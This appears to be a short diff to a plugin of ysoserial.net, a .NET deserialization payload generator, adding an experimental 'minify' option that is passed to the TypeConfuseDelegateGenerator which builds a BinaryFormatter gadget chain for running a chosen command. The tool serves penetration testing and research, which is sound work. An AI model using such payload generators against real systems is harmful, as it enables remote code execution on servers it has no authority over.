@@ -24,6 +24,7 @@ namespace ysoserial.Plugins
         static string mode = "";
         static string command = "";
         static Boolean test = false;
+        static Boolean minify = false;
 
         static OptionSet options = new OptionSet()
             {
@@ -31,6 +32,7 @@ namespace ysoserial.Plugins
                 {"o|output=", "the output format (raw|base64).", v => format = v },
                 {"c|command=", "the command to be executed", v => command = v },
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
+                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
             };
 
         public string Name()
@@ -120,7 +122,7 @@ namespace ysoserial.Plugins
             else
             {
                 // HttpStaticObjectsCollection
-                byte[] serializedData = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false);
+                byte[] serializedData = (byte[])new TypeConfuseDelegateGenerator().Generate(command, "BinaryFormatter", false, minify);
                 byte[] newSerializedData = new byte[serializedData.Length + 7]; // ReadInt32 + ReadString + ReadBoolean + ReadByte
                 serializedData.CopyTo(newSerializedData, 7);
                 newSerializedData[0] = 1; // for ReadInt32
